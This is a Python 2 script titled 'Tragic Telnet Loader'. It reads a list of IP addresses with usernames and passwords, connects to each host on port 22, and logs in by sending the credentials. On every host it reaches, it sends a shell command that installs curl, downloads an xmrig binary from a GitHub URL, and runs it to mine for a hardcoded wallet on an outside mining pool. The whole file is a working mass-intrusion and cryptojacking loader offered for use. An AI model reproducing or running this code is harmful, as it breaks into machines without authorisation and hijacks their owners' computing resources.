#!/usr/bin/python
# Tragic Telnet Loader

import sys, re, os, socket, time
from threading import Thread

if len(sys.argv) < 2:
	sys.exit("\x1b[31mUsage: python "+sys.argv[0]+" [list]\x1b[0m")

cmd="""
cd /boot; apt-get update -y; apt-get install curl -y; [ -f "xmrig" ] && rm xmrig; curl -o xmrig "https://raw.githubusercontent.com/rxu7s/Public/main/xmrig"; chmod 777 xmrig; ./xmrig --opencl --cuda -o pool.hashvault.pro:443 -u 44qZWd68jYxF9r8JZPgPrDFCFZLFiCvYERDDomyHfc7cRinwNjTsfHzZe19b7HNB7ggJxbwvArWZ35L9cSooJvZv56Rbxnd -p Linux -k --tls
"""
info = open(str(sys.argv[1]),'a+')

def tragedy(ip,username,password):
	ip = str(ip).rstrip("\n")
	username = username.rstrip("\n")
	password = password.rstrip("\n")
	try:
		tn = socket.socket()
		tn.settimeout(5)
		tn.connect((ip,22))
	except Exception:
		print ("\x1b[31m[+] Failed To Connect! -> %s\x1b[0m")%(ip)
		tn.close()
	try:
		tragic = ''
		tragic += readUntil(tn, "ogin")
		if "ogin" in tragic:
			tn.send(username + "\n")
			print ("\x1b[1;33m[+] Sending Username! -> %s\x1b[0m")%(ip)
			time.sleep(0.09)
		else:
			pass
	except Exception:
		tn.close()
	try:
		tragic = ''
		tragic += readUntil(tn, "assword:")
		if "assword" in tragic:
			tn.send(password + "\n")
			print ("\x1b[1;33m[+] Sending Password! -> %s\x1b[0m")%(ip)
			time.sleep(2)
		else:
			pass
	except Exception:
		tn.close()
	try:
		tn.send("sh" + "\n")
		time.sleep(0.05)
		tn.send(cmd + "\n")
		print ("\x1b[32m[+] Command Sent! -> %s\x1b[0m")%(ip)
		time.sleep(15)
		tn.close()
	except Exception:
		tn.close()

def readUntil(tn, string, timeout=8):
	buf = ''
	start_time = time.time()
	while time.time() - start_time < timeout:
		buf += tn.recv(1024)
		time.sleep(0.01)
		if string in buf: return buf
	raise Exception('TIMEOUT!')

for x in info:
	try:
		if ":22 " in x:
			x = x.replace(":22 ", ":")
		xinfo = x.split(":")
		session = Thread(target=tragedy, args=(xinfo[0].rstrip("\n"),xinfo[1].rstrip("\n"),xinfo[2].rstrip("\n"),))
		session.start()
		ip=xinfo[0]
		username=xinfo[1]
		password=xinfo[2]
		time.sleep(0.01)
	except:
		pass